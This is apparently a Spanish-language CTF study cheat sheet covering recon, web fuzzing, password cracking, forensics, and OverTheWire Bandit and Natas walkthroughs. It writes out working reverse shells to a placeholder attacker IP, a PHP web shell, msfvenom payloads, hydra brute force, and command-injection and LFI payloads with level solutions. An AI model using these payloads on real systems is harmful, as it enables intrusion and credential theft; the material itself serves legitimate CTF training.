0. Lo que haces con CUALQUIER archivo que te den#

file ARCHIVO
  • file mira los primeros bytes (magic bytes) y te dice qué es de verdad, sin fiarse de la extensión. Un ".jpg" puede ser un ZIP.
strings -n 6 ARCHIVO | less
  • strings saca las secuencias de texto legible dentro de un binario.
  • -n 6 = solo cadenas de 6 caracteres o más (quita ruido).
  • | less = lo paginas para leerlo. Sirve para ver la flag en claro, rutas, contraseñas.
strings -n 6 ARCHIVO | grep -iE 'flag|ctf|\{.*\}'
  • | grep filtra la salida anterior.
  • -i = ignora mayúsculas/minúsculas. -E = regex extendida.
  • 'flag|ctf|\{.*\}' = líneas con "flag", "ctf" o algo entre llaves. Encuentra la bandera directo.
xxd ARCHIVO | head
  • xxd = volcado hexadecimal + ASCII al lado. | head = primeras líneas.
  • Sirve para ver los magic bytes y arreglar archivos corruptos.
exiftool ARCHIVO
  • Lee metadatos: autor, fecha, GPS, comentarios. En imágenes muchas veces la flag va en un campo "Comment".
binwalk ARCHIVO
  • Busca archivos escondidos dentro de otro (un ZIP metido en un PNG, etc.).
binwalk -e ARCHIVO
  • -e = extrae lo que encontró. Los saca a una carpeta _ARCHIVO.extracted.

1. Cómo se estructura un comando (para que lo entiendas, no lo memorices)#

programa   -opciones   argumento
nmap       -sV -p-     10.10.10.5
└ qué uso  └ cómo      └ sobre qué
  • Las opciones cortas van con un guion: -p. Las largas con dos: --script.
  • Puedes encadenar salidas con | (tubería): la salida de la izquierda entra a la derecha.
  • Puedes guardar la salida con >: nmap ... > resultado.txt.
  • comando --help o man comando te dan todas las opciones.

2. Reconocimiento de red / servicios#

nmap -sC -sV -p- OBJETIVO
  • nmap = escáner de puertos.
  • -p- = escanea los 65535 puertos (no solo los comunes).
  • -sV = detecta la versión del servicio de cada puerto.
  • -sC = corre los scripts básicos de reconocimiento.
  • Para qué: saber qué está corriendo y por dónde atacar.
nc OBJETIVO PUERTO
  • nc (netcat) = te conectas "a pelo" a un puerto. Muchos retos de misc/pwn te dan host puerto y hablas con el servicio aquí.

3. Web#

curl -s http://OBJETIVO
  • curl = pide una URL desde la terminal. -s = silencioso (sin barra de progreso).
curl -sI http://OBJETIVO
  • -I = solo las cabeceras (headers). Ves servidor, cookies, redirecciones.
curl -s http://OBJETIVO/robots.txt
  • Archivos que suelen revelar rutas ocultas: robots.txt, sitemap.xml, /.git/.
gobuster dir -u http://OBJETIVO -w /usr/share/wordlists/dirb/common.txt
  • gobuster dir = busca rutas/carpetas ocultas probando palabras de una lista.
  • -u = la URL. -w = el diccionario (wordlist) de nombres a probar.
  • Para qué: encontrar /admin, /backup, /flag.txt, etc.
ffuf -u http://OBJETIVO/FUZZ -w LISTA.txt
  • ffuf = fuzzer rápido. Donde pongas FUZZ, va probando cada palabra de la lista.
  • Sirve igual que gobuster y también para parámetros o subdominios (mueves el FUZZ).
sqlmap -u "http://OBJETIVO/item?id=1" --batch --dbs
  • sqlmap = automatiza inyección SQL (solo contra el reto autorizado).
  • -u = la URL con el parámetro. --batch = responde solo a las preguntas.
  • --dbs = lista las bases de datos. Luego -D nombre --tables, --dump, etc.

4. Contraseñas y hashes#

hashid 'EL_HASH'
  • Te dice qué tipo de hash es (MD5, SHA1, bcrypt...). Así eliges el modo correcto.
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
  • hashcat = rompe hashes probando palabras.
  • -a 0 = modo diccionario. -m 0 = tipo de hash (0 = MD5; 100 = SHA1; 1800 = sha512crypt).
  • El último argumento es el diccionario. Saca la contraseña si está en la lista.
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  • john (John the Ripper) = lo mismo, suele detectar el tipo solo.
zip2john archivo.zip > h.txt && john --wordlist=rockyou.txt h.txt
  • zip2john convierte un ZIP con contraseña a un formato que John entiende.
  • && = corre el segundo comando solo si el primero salió bien.

5. Esteganografía (datos escondidos en imágenes/audio)#

steghide extract -sf imagen.jpg
  • steghide extract = saca datos ocultos de un JPG. -sf = archivo de origen.
  • Te pide contraseña: prueba vacía (Enter) o palabras del reto.
zsteg imagen.png
  • Revisa los bits menos significativos de un PNG/BMP (truco de stego clásico).
steghide info imagen.jpg
  • Dice si el archivo tiene algo embebido antes de extraer.

Para audio: ábrelo en Audacity y mira el espectrograma (la flag se "dibuja").

6. Capturas de red (.pcap)#

tshark -r captura.pcap | head
  • tshark = Wireshark en consola. -r = lee un archivo. Ves los paquetes.
tshark -r captura.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
  • -Y "..." = filtro (aquí, solo peticiones HTTP).
  • -T fields -e campo = muestra solo esos campos. Útil para ver qué URLs se pidieron.

En Wireshark (gráfico): clic derecho en un paquete → Follow > TCP Stream para leer toda la conversación; File > Export Objects > HTTP para sacar archivos transferidos.

7. Reversing (entender un binario)#

checksec --file=BINARIO
  • Muestra las protecciones (NX, PIE, canary). Define cómo lo vas a atacar.
ltrace ./BINARIO
  • Muestra las llamadas a librería mientras corre. Un strcmp(tuEntrada, "clave") te revela la contraseña.
./BINARIO; echo $?
  • Lo corres y echo $? imprime el código de salida (0 = ok). Para ver cómo reacciona.

Para leer el código: abre el binario en Ghidra (ghidra), impórtalo, doble clic en main → te da pseudo-C.

8. Decodificar texto raro (base64, hex, rot...)#

echo "dGV4dG8=" | base64 -d
  • base64 -d = decodifica. (Sin -d codifica.) El = al final delata base64.
echo "74657874" | xxd -r -p
  • xxd -r -p = convierte hex a texto (-r revierte, -p formato plano).
echo "GUVKByB" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
  • tr = sustituye caracteres. Esto es ROT13 (corre el alfabeto 13 lugares).
echo -n "texto" | base64          # codificar
echo -n "texto" | md5sum          # sacar su MD5
  • -n = sin salto de línea al final (importante, cambia el hash).

Para algo visual y sin instalar nada raro: clona CyberChef antes del evento y abre su HTML en el navegador (funciona offline).

9. Buscar la flag en todo un directorio#

grep -raoiE '[A-Za-z0-9_]+\{[^}]+\}' .
  • grep busca texto. -r = recursivo (entra a subcarpetas). -a = trata binarios como texto.
  • -o = muestra solo lo que coincide. -i = ignora mayúsculas. -E = regex.
  • '[A-Za-z0-9_]+\{[^}]+\}' = el patrón típico de bandera palabra{...}.
  • . = la carpeta actual. Barre todo buscando la flag de un golpe.

12. Tráfico — tcpdump y tshark (además de Wireshark)#

tcpdump -r cap.pcap -nn
  • -r lee un archivo. -nn = no resolver nombres/puertos (más rápido y claro).
tcpdump -r cap.pcap -A | grep -i flag
  • -A = muestra el payload en ASCII. Lo filtras por "flag".
tcpdump -r cap.pcap 'port 21'
  • Filtro BPF de captura (host, port, tcp, and/or). Ojo: los filtros BPF no son los de display de Wireshark.
tshark -r cap.pcap --export-objects http,./out
  • Extrae todos los archivos HTTP transferidos a la carpeta ./out.
tshark -r cap.pcap -T fields -e data | xxd -r -p | strings | grep -i flag
  • Saca el campo data crudo → lo pasa de hex a bytes → texto → busca la flag.

Qué buscar en un pcap: credenciales en claro (FTP/Telnet/HTTP Basic), DNS exfil (subdominios larguísimos = datos en base32/hex), ICMP con payload raro, USB-HID (teclas que hay que decodificar), y si dan keylog TLS: Wireshark → Preferences → TLS → (Pre)-Master-Secret.

13. Reversing — gdb y radare2 (entrar al binario)#

checksec --file=BINARIO
  • Protecciones (NX, PIE, canary): definen cómo lo atacas.
ltrace ./BINARIO
  • Llamadas a librería; un strcmp(tuInput,"clave") te revela la contraseña.
gdb ./BINARIO

Dentro de gdb:

  • break main = pausa al entrar a main. run = ejecuta. info functions = lista funciones.
  • x/20i $pc = muestra 20 instrucciones desde donde está parado. c = continuar.
r2 -A BINARIO
  • radare2 con análisis. Dentro: aaa (analiza), afl (lista funciones), pdf @ main (desensambla main), iz (strings).
  • Para leer pseudo-C cómodo: Ghidra → importar → analizar todo → doble clic en main.

15. Forense de disco — Sleuth Kit y carving#

mmls disco.img
  • Tabla de particiones (te da el OFFSET que usas abajo).
fls -r -o OFFSET disco.img
  • Lista archivos, incluidos borrados (-r recursivo, -o el offset de la partición).
icat -o OFFSET disco.img INODO > recuperado
  • Recupera un archivo por su número de inodo.
foremost -i disco.img -o salida/

  • Extrae todo lo que binwalk reconozca por firma.

16. Blue Team — análisis de logs (grep + razonar)#

grep -i "flag" *.log
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head
  • awk '{print $1}' saca la primera columna (IP) de cada línea. sort | uniq -c cuenta repetidas. sort -rn | head = las más frecuentes → posible atacante.
grep "Failed password" auth.log | awk '{print $11}' | sort | uniq -c
  • Cuenta intentos fallidos por origen → fuerza bruta.
cat eventos.json | jq '.[] | select(.event=="login")'
  • jq filtra JSON. Aquí, solo los eventos de login.

Patrones: fuerza bruta (muchos fallos y luego un éxito desde la misma IP), web attack (../, UNION, <script> en access.log), exfil (respuestas enormes, user-agents raros), persistencia (usuarios/cron nuevos).

18. Cripto/estego — lo que faltaba#

hashcat por modo#

hashcat -m 0 h.txt rockyou.txt      # 0=MD5 100=SHA1 1400=SHA256 1800=sha512crypt 3200=bcrypt 1000=NTLM 16500=JWT
hashcat -m 0 h.txt -a 3 '?d?d?d?d'  # -a 3 = máscara; ?d un dígito (prueba 0000-9999)

john por formato#

john --format=raw-md5 --wordlist=rockyou.txt h.txt && john --show h.txt

Archivos protegidos → a formato de john#

zip2john a.zip > h.txt   # también pdf2john, rar2john, ssh2john

19. feroxbuster ("ferro") — descubrir rutas, pero RECURSIVO#

Es un fuzzer de directorios/archivos como gobuster/ffuf, pero su gracia es que baja solo por las carpetas que va encontrando. Va en los paquetes de la guía de tu compañero. Para qué: encontrar /admin, /backup, /uploads/secret/flag.txt, etc.

feroxbuster -u http://OBJETIVO
  • -u = la URL base. Sin más, ya fuzzea y entra recursivamente en lo que halla.
feroxbuster -u http://OBJETIVO -w /usr/share/wordlists/dirb/common.txt
  • -w = el diccionario de nombres a probar.
feroxbuster -u http://OBJETIVO -x php,txt,bak -d 2
  • -x = prueba además esas extensiones (index.php, config.bak…).
  • -d 2 = profundidad de recursión = 2 niveles (evita que se vaya eternamente).
feroxbuster -u http://OBJETIVO -C 404,403 -o ferox.txt
  • -C = oculta esos códigos de estado (filtra el ruido del "404 bonito").
  • -o = guarda la salida a archivo → evidencia para el writeup.
Cuándo cada uno: feroxbuster si quieres recursión automática; ffuf para fuzzear parámetros/subdominios (mueves FUZZ); gobuster es el clásico simple. Los tres hacen lo mismo de base.

20. Inyección de shell — de "ejecuto comandos" a "tengo una consola"#

Contexto: en un reto web con command injection (sección 17) o un servicio vulnerable, muchas veces no basta con ; cat flag.txt: necesitas una shell interactiva en la máquina para moverte. Eso es "inyectar una shell". Solo contra la infraestructura del reto.

Paso 1 — en TU máquina (Kali), ponte a escuchar#

nc -lvnp 4444
  • nc = netcat. -l = modo escucha (listener). -v = verboso. -n = sin DNS. -p 4444 = puerto donde esperas la conexión.
  • Aquí llegará la shell de la víctima. Déjalo abierto.

Paso 2 — en la víctima (vía la inyección), lanza la reverse shell#

Pones uno de estos como comando inyectado. TU_IP = la IP de tu Kali, 4444 = el puerto de arriba.

bash -i >& /dev/tcp/TU_IP/4444 0>&1
  • Abre una bash interactiva (-i) y redirige su entrada/salida al socket TCP hacia tu máquina. La más usada en Linux.
nc TU_IP 4444 -e /bin/sh
  • netcat conecta a tu listener y -e le entrega una /bin/sh. (No todos los nc traen -e.)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TU_IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'
  • Si hay Python en la víctima: crea el socket, engancha stdin/stdout/stderr y lanza una shell. Útil cuando nc no tiene -e.
Reverse (la víctima se conecta a ti) suele funcionar mejor que bind (tú te conectas a la víctima), porque los firewalls bloquean conexiones entrantes a la víctima pero no las salientes.

Paso 3 — estabilizar la shell (que funcionen flechas, Ctrl-C, nano)#

Una reverse shell cruda es incómoda. Para volverla usable:

python3 -c 'import pty;pty.spawn("/bin/bash")'   # en la shell recibida
# luego pulsas: Ctrl-Z
stty raw -echo; fg                                # en TU Kali
export TERM=xterm                                 # de vuelta en la shell
  • pty.spawn te da una pseudo-terminal real. El stty raw -echo; fg devuelve el control del teclado. Ya puedes usar sudo, editores, etc.

Web shell (cuando puedes SUBIR un archivo)#

Si el reto deja subir archivos y el servidor ejecuta PHP:

<?php system($_GET['c']); ?>
  • Lo guardas como shell.php, lo subes, y luego:
curl "http://OBJETIVO/uploads/shell.php?c=id"
curl "http://OBJETIVO/uploads/shell.php?c=cat%20/flag.txt"
  • ?c= = el comando a ejecutar (%20 es un espacio en URL). Desde aquí puedes lanzar la reverse shell del Paso 2.

Qué hacer ya con una shell dentro#

id ; whoami ; hostname        # quién soy y dónde
find / -name 'flag*' 2>/dev/null   # buscar la bandera por todo el disco
cat /home/*/flag.txt /flag.txt 2>/dev/null
sudo -l                        # ¿qué puedo correr como root sin pass? (escalada)
  • find / -name 'flag*' 2>/dev/null = busca archivos que empiecen con "flag" en todo el sistema; 2>/dev/null esconde los errores de permisos.
  • sudo -l + GTFOBins (lo descargaste) = ruta típica para escalar a root y leer la flag protegida.
Para el writeup: documenta el listener, el comando inyectado exacto, y el cat que reveló la flag. Es una cadena muy vistosa para la rúbrica (reconocimiento → inyección → shell → flag).

Usar un web shell que ya subiste (post-explotación)#

Si subiste un shell.php que ejecuta system($_GET['cmd']), le pasas comandos por la URL:

curl -G "http://IP/ruta/shell.php" --data-urlencode "cmd=id"
curl -G "http://IP/ruta/shell.php" --data-urlencode "cmd=find / -name 'flag*' 2>/dev/null"
  • -G = manda GET con los datos en la URL (?cmd=...). --data-urlencode = codifica espacios/comillas para que el comando no se rompa.
  • Desde aquí enumeras: cat /etc/passwd, consultar la BD con mysql -u USER -p'PASS' -e 'show databases;', y finalmente lanzar la reverse shell del paso 2.
  • Interpretar: la respuesta HTTP trae la salida del comando. Si sale vacío o un error PHP, prueba otro parámetro (c, cmd, 0) o revisa que el archivo exista.

PARTE 5 — Hydra y Metasploit (⚠️ ambos zona gris)#

21. hydra — fuerza bruta de login (en línea)#

  • Por qué: prueba miles de usuario/contraseña contra un servicio de login (SSH, FTP, HTTP...).
  • Cuándo: tienes un login y sospechas credenciales débiles. Ojo: es ruidoso y automatizado (zona gris).
  • Cómo: hydra -l USUARIO -P LISTA.txt SERVICIO://OBJETIVO
    • -l = un usuario fijo · -L = lista de usuarios · -P = lista de contraseñas · -p = una contraseña fija.
# SSH con un usuario conocido
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5

# FTP
hydra -l ftpuser -P rockyou.txt ftp://10.10.10.5

# login web por POST (el formato pide: ruta:campos:texto-de-fallo)
hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid"
  • En el formulario web: ^USER^/^PASS^ es donde inyecta cada intento, y Invalid es el texto que aparece cuando falla (hydra lo usa para saber qué NO funcionó).
  • Interpretar:
    • [22][ssh] host: ... login: admin password: hunter2 → credencial encontrada.
    • Termina sin esa línea → no estaba en la lista.
    • all children died / errores de conexión → el servicio te está bloqueando o el puerto está mal.

22. msfconsole — Metasploit (framework de explotación)#

  • Por qué: tiene exploits y payloads listos para vulnerabilidades conocidas; automatiza la explotación.
  • Cuándo: identificaste servicio+versión vulnerable (con nmap -sV/searchsploit) y hay módulo. Zona gris: confirma reglas; para estilo, prefiere el exploit manual.
  • Cómo (flujo dentro de la consola):
msfconsole                      # abrir (tarda unos segundos)
search projectsend              # buscar módulo por software
use exploit/ruta/del/modulo     # seleccionarlo
info                            # leer qué hace y qué opciones pide
show options                    # ver parámetros obligatorios
set RHOSTS 10.10.10.5           # objetivo
set LHOST TU_IP                 # tu IP (para la reverse shell)
set LPORT 4444
check                           # (si el módulo lo soporta) ¿es vulnerable?
run                             # lanzar
  • Interpretar:
    • [+] ... The target is vulnerable (de check) → adelante con run.
    • Meterpreter session 1 opened → entraste; escribe shell para una consola, o getuid, sysinfo.
    • Exploit completed, but no session was created → falló: revisa LHOST, el payload (set payload ...) o que de verdad sea vulnerable.
    • search sin resultados → no hay módulo; vuelve a searchsploit y hazlo manual.
  • Payload útil para generar un ejecutable/reverse (msfvenom):
msfvenom -p linux/x64/shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f elf -o rev.elf
    • Lo subes a la víctima y lo ejecutas mientras escuchas con nc -lvnp 4444.

Comandos de OverTheWire Bandit — explicados#

Todos los comandos que Bandit te hace usar, con qué hacen y la trampa típica. Pensado para leer bajo presión: buscas el comando, ves el ejemplo, lo copias. La contraseña de cada nivel casi siempre es una sola cadena de ~32 caracteres; si lo que ves es más largo, aún no es la flag.

0. Moverte y mirar#

ls              # lista archivos de la carpeta actual
ls -a           # TAMBIÉN los ocultos (empiezan con punto: .file2)
ls -la          # ocultos + detalles (tamaño, permisos, dueño)
ls -la --color  # colorea; útil cuando hay archivos con nombres raros
cd carpeta      # entra a una CARPETA (no a un archivo)
cd ..           # sube un nivel
cd ~            # vuelve a tu home
cd -            # vuelve a la carpeta anterior
pwd             # dice en qué carpeta estás
  • cd solo entra a carpetas. Para ver un archivo usa cat, no cd.
  • Un archivo que empieza con . está oculto: no sale en ls normal, sí en ls -a.

1. Nombres de archivo raros (la trampa de Bandit)#

Bandit te da archivos como -, -file1, spaces in this filename, .hidden. El problema es que el nombre confunde al comando.

cat ./-file1                 # nombre que empieza con "-": antepón ./
cat -- -file1                # alternativa: -- dice "ya no hay más opciones"
cat "spaces in this file"    # nombre con espacios: entre comillas
cat spaces\ in\ this\ file   # o escapando cada espacio con \
cat ./.hidden                # archivo oculto: va con su punto
  • Si un nombre empieza con -, el comando cree que es una opción. Antepón

./ o usa --.

  • Si el nombre tiene espacios, ponlo entre "comillas" o escapa con \.
  • Truco: escribe las primeras letras y pulsa Tab; la terminal completa y

escapa el nombre por ti.

2. Leer el contenido de un archivo#

cat archivo         # vuelca TODO el archivo a la pantalla
less archivo        # lo abre paginado (flechas para moverte, q para salir)
head archivo        # primeras 10 líneas
head -1 archivo     # solo la primera línea (útil si hay relleno debajo)
tail archivo        # últimas 10 líneas
tail -5 archivo     # últimas 5 líneas
  • Si cat saca "basura" (binario), no es texto: pásalo por file primero.
  • Si el archivo trae la flag arriba y relleno abajo, head -1 te la deja sola.

3. ¿Qué tipo de archivo es?#

file archivo              # dice qué es: ASCII text, ELF, gzip, data...
file ./*                  # el tipo de TODOS los de la carpeta
find . -type f -exec file {} +   # el tipo de todos, incluso en subcarpetas
  • Antes de romperte la cabeza, file te dice si es texto, imagen, comprimido o

ejecutable. Marca el siguiente paso.

4. find — buscar archivos por características#

El comando estrella de Bandit. Busca por nombre, tamaño, dueño, permisos.

find .                        # lista todo bajo la carpeta actual (recursivo)
find . -type f                # solo archivos (no carpetas)
find . -name "*.txt"          # por nombre / extensión
find . -iname "FLAG*"         # -i = sin distinguir mayúsculas

# Por TAMAÑO (la 'c' = bytes exactos):
find . -size 1033c            # exactamente 1033 bytes
find . -size +1k -size -1M    # entre 1 KiB y 1 MiB

# Por DUEÑO y PERMISOS (nivel típico de Bandit):
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
find / -type f -perm -u=s 2>/dev/null     # archivos con SETUID (-perm -u=s)
  • -size: c = bytes, k = KiB, M = MiB. **Sin la c cuenta en bloques

de 512 bytes** y no encuentras nada. Es el error más común.

  • 2>/dev/null: tira los errores de "permiso denegado" para que solo veas

los resultados buenos. Imprescindible al buscar en /.

  • -exec ... {} +: ejecuta un comando sobre cada resultado. {} es el

archivo encontrado.

  • Para ejecutar un binario SETUID que encontraste: /ruta/al/binario.

5. grep — buscar texto DENTRO de archivos#

grep "palabra" archivo        # líneas que contienen "palabra"
grep -i flag archivo          # -i = sin distinguir mayúsculas
grep -r flag .                # -r = recursivo, busca en toda la carpeta
grep -v basura archivo        # -v = al revés: líneas que NO la tienen
grep millionth data.txt       # nivel típico: la línea con una palabra clave
  • En Bandit hay un nivel donde la contraseña está en la única línea que

contiene cierta palabra: grep palabra archivo.

6. sort y uniq — ordenar y contar repetidos#

Van casi siempre juntos. uniq solo junta repetidos que están PEGADOS, así que primero sort.

sort archivo                  # ordena las líneas alfabéticamente
sort -n archivo               # orden numérico (no "10" antes que "2")
sort -u archivo               # ordena Y quita duplicados

uniq archivo                  # colapsa líneas repetidas CONSECUTIVAS
sort archivo | uniq           # lo correcto: ordenar y luego quitar repetidos
sort archivo | uniq -c        # -c = cuenta cuántas veces sale cada línea
sort archivo | uniq -u        # -u = solo las que aparecen UNA vez (¡la flag!)
sort archivo | uniq -d        # -d = solo las que SÍ se repiten
  • Nivel típico: "la contraseña es la única línea que aparece una sola vez" →

sort data.txt | uniq -u.

  • Nivel típico: "la línea que se repite N veces" → sort data.txt | uniq -c.

7. strings — texto legible dentro de un binario#

strings archivo               # saca las cadenas de texto de un binario
strings -n 8 archivo          # solo cadenas de 8+ caracteres (menos ruido)
strings data.txt | grep -i password   # busca la pista entre el ruido
  • Cuando file dice que es "data" o binario pero sabes que esconde texto.

8. Decodificar y transformar texto#

# base64 (texto tipo "cGFzc3dvcmQ=")
base64 -d archivo             # -d = decodificar
cat archivo | base64 -d

# hex / volcado byte a byte
xxd archivo                   # muestra el archivo en hexadecimal
xxd -r -p archivo             # -r -p = de hex de vuelta a binario

# ROT13 y similares con tr (traduce/rota caracteres)
cat archivo | tr 'A-Za-z' 'N-ZA-Mn-za-m'   # ROT13
cat archivo | tr 'a-z' 'A-Z'               # a mayúsculas
  • Bandit tiene un nivel ROT13 y otro base64: reconoce el patrón y aplica el de

arriba.

9. Descomprimir (el nivel de las capas)#

Un nivel te da un archivo comprimido muchas veces. file te dice de qué tipo es cada capa; descomprimes, vuelves a hacer file, y repites.

file data                     # ¿qué tipo es esta capa?

# según lo que diga file:
gzip -d archivo.gz            # gzip        (o: zcat archivo.gz)
bzip2 -d archivo.bz2          # bzip2
tar xf archivo.tar            # tar (desempaqueta)
tar xzf archivo.tar.gz        # tar + gzip
mv data data.gz               # si no tiene la extensión, pónsela antes
  • Bucle: file → descomprimir según el tipo → file otra vez → hasta que salga

"ASCII text". Esa es la flag.

10. Conectarte a servicios (red)#

la siguiente. Si el puerto es cifrado, usa ncat --ssl u openssl s_client.

  • scp copia archivos por SSH (útil para bajarte una llave privada):

scp -P 2220 usuario@host:/ruta/archivo .

11. Comparar y recortar#

cut -d: -f1 archivo           # corta columnas; -d= separador, -f= campo nº
cut -c1-32 archivo            # corta por caracteres (los primeros 32)
md5sum archivo                # huella del archivo (para comparar)

diff.

OverTheWire Natas + Krypton — explicados#

Recorrido razonado de dos wargames de OverTheWire:

  • Natas — seguridad web del lado del servidor (se juega en el navegador: fuente HTML, cabeceras, cookies, parámetros, inyecciones). Herramientas: navegador, curl, proxy (ZAP/Burp).
  • Krypton — criptografía clásica (se juega por SSH: lees archivos y descifras).

Convención: MAYÚSCULAS = lo cambias tú (tu contraseña, tu ruta). Cada nivel trae Concepto · Técnica · Comando · Lección.

Idea transversal que se repite en casi todo: nunca confíes en datos que controla el cliente (fuente, cabeceras, cookies, parámetros). La validación de seguridad va en el servidor.

Natas (web — server-side)#

Se accede por navegador con HTTP Basic Auth. Cada nivel: http://natasN.natas.labs.overthewire.org · usuario natasN · la pass de natasN la sacaste en el nivel anterior. Las contraseñas también están en /etc/natas_webpass/natasN dentro del servidor.

Reflejo base en cada nivel antes de lanzar herramientas: mira la página, su código fuente (Ctrl+U), la URL/parámetros, las cookies y las cabeceras. Y si hay enlace "View sourcecode", léelo: es el PHP del servidor.

Natas 0 → 1 — pass en el código fuente#

  • Concepto: lo visible en la página no es todo lo que se envía al navegador.
  • Técnica: ver el código fuente y buscar comentarios HTML <!-- ... -->.
  • Comando: Ctrl+U en el navegador (o curl -u natas0:natas0 http://natas0.natas.labs.overthewire.org/).
  • Lección: ocultar algo en un comentario no lo protege; el cliente recibe todo el HTML.

Natas 1 → 2 — igual, con click derecho bloqueado#

  • Concepto: bloquear la UI (click derecho) ≠ proteger el dato.
  • Técnica: Ctrl+U igualmente, o DevTools (F12). El bloqueo es solo cosmético.
  • Lección: la seguridad del lado del cliente es una ilusión; se salta trivialmente.

Natas 2 → 3 — directory listing (/files/)#

  • Concepto: no importa el archivo (un pixel 1×1 transparente, señuelo sin metadata), importa de qué carpeta se carga.
  • Técnica: en el fuente aparece <img src="files/pixel.png">. Visitar la carpeta directa: /files/. El servidor tiene el listado de directorios activado → se ve users.txt con la pass.
  • Comando: navegar a http://natas2.natas.labs.overthewire.org/files/
  • Lección: el directory listing activado filtra archivos que no debían verse.

Natas 3 → 4 — robots.txt#

  • Concepto: la pista "Not even Google will find it" apunta a cómo se le dice a los buscadores qué no indexar.
  • Técnica: leer robots.txt (público). La línea Disallow: revela una carpeta "secreta" con users.txt.
  • Comando: navegar a http://natas3.natas.labs.overthewire.org/robots.txt
  • Lección: robots.txt es una lista pública de lo que quieres esconder. "Ocultar" revela.

Natas 4 → 5 — falsificar la cabecera Referer#

  • Concepto: el servidor decide el acceso según la cabecera HTTP Referer ("vengo de esta página")... que la pone el cliente.
  • Técnica: mandar un Referer falso con el valor exacto que pide el mensaje de error.
  • Comando:

``bash curl -u natas4:TU_PASS -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/ | grep -i pass ``

  • Trampa habitual: las \ de continuación de línea solo valen si pulsas Enter tras cada una. En una sola línea, quita todas las \ (si no: curl: (3) URL rejected: Malformed input).
  • Lección: Referer, User-Agent, cookies... los controla el cliente y se falsean. No sirven para autorizar.

Natas 5 → 6 — cookie de sesión falsificable#

  • Concepto: dice "no estás logueado" sin formulario → lo decide una cookie.
  • Técnica: ver Set-Cookie (con curl -i), ves loggedin=0; cámbiala a 1.
  • Comando:

``bash curl -i -u natas5:TU_PASS http://natas5.natas.labs.overthewire.org/ # ver la cookie curl -u natas5:TU_PASS -b "loggedin=1" http://natas5.natas.labs.overthewire.org/ | grep -i pass ``

  • Lección: una cookie sin firmar (loggedin=0/1) es trivial de manipular. Las sesiones reales usan tokens firmados (HMAC) o aleatorios.

Natas 6 → 7 — leer el fuente PHP (archivo incluido accesible)#

  • Concepto: primer nivel donde hay que leer la lógica del servidor. El PHP hace include "includes/secret.inc" y compara tu input con $secret.
  • Técnica: pedir el archivo incluido directamente. Si sale en blanco (PHP no imprime), míralo con Ctrl+U o curl.
  • Comando: curl -u natas6:TU_PASS http://natas6.natas.labs.overthewire.org/includes/secret.inc → metes el secreto en el formulario.
  • Lección: separar un secreto en otro fichero no sirve si ese fichero es descargable. Los secretos van fuera del webroot o en config protegida.

Natas 7 → 8 — LFI (Local File Inclusion)#

  • Concepto: primera inyección real. La web usa index.php?page=home metiendo el parámetro directo en un include.
  • Técnica: cambiar page por la ruta del archivo a leer (la pista del fuente da la ruta exacta).
  • Comando:

``bash curl -u natas7:TU_PASS "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" ``

  • Lección: nunca metas input del usuario en una ruta/include sin validar. LFI permite leer archivos arbitrarios (/etc/passwd, contraseñas...).

Natas 8 → 9 — codificación reversible (hex + strrev + base64)#

  • Concepto: el secreto está "escondido" con bin2hex(strrev(base64_encode($secret))). Codificación, no cifrado: sin clave, reversible.
  • Técnica: deshacer cada paso en orden inverso: hex2bin → strrev → base64_decode.
  • Comando:

``bash echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d # o: php -r 'echo base64_decode(strrev(hex2bin("3d3d...")));' ``

  • Lección: codificar ≠ cifrar. Base64/hex/invertir no protegen nada: no hay clave.

Natas 9 → 10 — command injection#

  • Concepto: passthru("grep -i $key dictionary.txt") mete tu texto tal cual en un comando de shell.
  • Técnica: cerrar el comando y encadenar el tuyo con ;.
  • Comando (en el campo de búsqueda): ; cat /etc/natas_webpass/natas10 ;
  • Lección: nunca construyas comandos de shell concatenando input. Lleva a RCE (ejecución remota de código), el peor caso.

Natas 10 → 11 — blacklist incompleta (abusar de grep)#

  • Concepto: mismo bug, pero filtran ; | & con preg_match('/[;|&]/',$key). Ya no encadenas... pero el grep sigue siendo tuyo.
  • Técnica: pasar un patrón que casa con todo (.*) + un segundo archivo. Grep imprime, por cada archivo, las líneas que coinciden.
  • Comando (en el campo): .* /etc/natas_webpass/natas11

→ se ejecuta grep -i .* /etc/natas_webpass/natas11 dictionary.txt

  • Lección: las blacklists casi siempre fallan; dejan mil formas de abusar lo permitido. Mejor whitelist estricta o no tocar la shell.

Natas 11 → 12 — XOR con clave reutilizada (known-plaintext)#

  • Concepto: la cookie data = base64(xor_encrypt(json)). Necesitas showpassword=yes, pero la clave XOR está censurada.
  • Técnica (ataque de texto plano conocido): conoces el plano por defecto ({"showpassword":"no","bgcolor":"#ffffff"}) y tienes el cifrado (tu cookie). Propiedad del XOR: cifrado XOR plano = clave. Recuperas la clave (se repite) y fabricas tu cookie con yes.
  • Comando (PHP):

``php <?php function xc($in,$k){$o="";for($i=0;$i<strlen($in);$i++)$o.=$in[$i]^$k[$i%strlen($k)];return $o;} $cif = base64_decode("TU_COOKIE"); $clave = xc($cif, json_encode(array("showpassword"=>"no","bgcolor"=>"#ffffff"))); echo base64_encode(xc(json_encode(array("showpassword"=>"yes","bgcolor"=>"#ffffff")), $clave))."\n"; ` Pones esa cookie nueva (F12 → Cookies o curl -b "data=..."`) y recargas.

  • Lección: reutilizar clave en XOR es un desastre: con parte del plano conocido se recupera la clave. Y una cookie decide permisos → mal. Cookies firmadas/autenticadas.

Krypton (cripto clásica)#

Se juega por SSH: ssh kryptonN@krypton.labs.overthewire.org -p 2231. Los archivos están en /krypton/kryptonN/. Truco mental: te conectas como kryptonN, pero la pass de kryptonN se obtiene descifrando los datos del reto de krypton(N-1); los nombres de archivo apuntan al nivel destino.

Krypton 0 → 1 — Base64#

